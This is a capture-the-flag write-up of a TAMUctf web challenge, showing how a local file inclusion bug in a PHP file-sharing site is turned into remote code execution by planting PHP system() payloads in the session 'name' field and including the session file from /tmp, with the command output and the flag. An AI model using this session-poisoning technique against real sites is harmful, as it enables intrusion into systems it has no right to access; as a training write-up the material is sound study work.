# Filestorage
Web

> Try out my new file sharing site!
> 
> http://filestorage.tamuctf.com

We are presented with a name option initially. Let's just put whatever for now (injections on the main page won't work, and the XSS is useless).

We are given 3 files. When we click on them, it takes us to `/index.php?file=<file>`, an obvious LFI vulnerability. Now we just have to find a way to get RCE.

We can get RCE by using PHP's sessions. I followed [this article](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/).

We know that this server runs PHP7 from headers that are given to us.

However, visiting `/var/lib/php/sessions/sess_<sessid>` was useless.

Apparently `/tmp` is the default according to [this article](https://canvas.seattlecentral.edu/courses/937693/pages/10-advanced-php-sessions).

So, our cookie is stored under `/tmp/sess_<sessid>`

When we use LFI to visit that, we have our cookie coming back to us, unfiltered. We can then run commands to get the flag, by setting our name to malicious PHP code.

`<?php system("ls"); ?>` gives us:
`name|s:21:"files index.html index.php ";`

`<?php system("find / -name 'flag*'"); ?>` gives us:
`name|s:40:"/sys/devices/pnp0/00:06/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS2/flags /sys/devices/platform/serial8250/tty/ttyS3/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/eth0/flags /proc/sys/kernel/sched_domain/cpu0/domain0/flags /proc/sys/kernel/sched_domain/cpu1/domain0/flags /flag_is_here /flag_is_here/flag.txt ";`

`<?php system("cat /flag_is_here/flag.txt"); ?>` gives `name|s:46:"gigem{535510n_f1l3_p0150n1n6}";`

Flag: `gigem{535510n_f1l3_p0150n1n6}`
